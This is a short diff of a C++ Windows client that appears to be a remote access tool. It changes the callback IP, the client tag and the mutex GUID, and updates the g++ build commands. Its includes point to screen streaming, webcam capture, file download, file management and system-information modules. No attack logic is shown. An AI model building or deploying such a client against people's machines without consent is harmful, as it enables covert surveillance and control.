@@ -1,4 +1,3 @@
-#define WIN32_LEAN_AND_MEAN
 #include <iostream>
 #include <winsock2.h>
 #include <chrono>
@@ -19,13 +18,13 @@
 #include "box_message/MessageBoxGUI.h"
 #include "screen/ScreenStreamer.h"
 
-#define IP "192.168.82.182"
+#define IP "192.168.1.133"
 
 #define PORT 3055
 
-#define TAG_NAME "Client 1"
+#define TAG_NAME "Client"
 
-#define MUTEX "ed5c02e5-b38a-4e36-bcd8-8c22d35235a9"
+#define MUTEX "8c7a9de4-9b7e-4a9b-a1d7-739acb255c9b"
 
 #define TIMING_RETRY 10000
 
@@ -46,14 +45,14 @@
 // final
 
 /* Without camera
- * g++  -I opencv/include  -L opencv/lib Client 1.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -lopencv_core460 -lopencv_videoio460 -lopencv_imgcodecs460 -lwsock32 -lWininet -lole32 -loleaut32 -o Client 1
+ * g++  -I opencv/include  -L opencv/lib Client.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -lopencv_core460 -lopencv_videoio460 -lopencv_imgcodecs460 -lwsock32 -lWininet -lole32 -loleaut32 -o Client
  */
 
 /* With camera
- * g++ Client 1.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:/opencv_static/mingw-build/install/include -LC:/opencv_static/mingw-build/install/x64/mingw/staticlib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
+ * g++ Client.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:/opencv_static/mingw-build/install/include -LC:/opencv_static/mingw-build/install/x64/mingw/staticlib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
  *
  * Inside repository
- *  g++ Client 1.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:opencv_static/include -Lopencv_static/lib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
+ *  g++ Client.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:opencv_static/include -Lopencv_static/lib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
  */
 
 
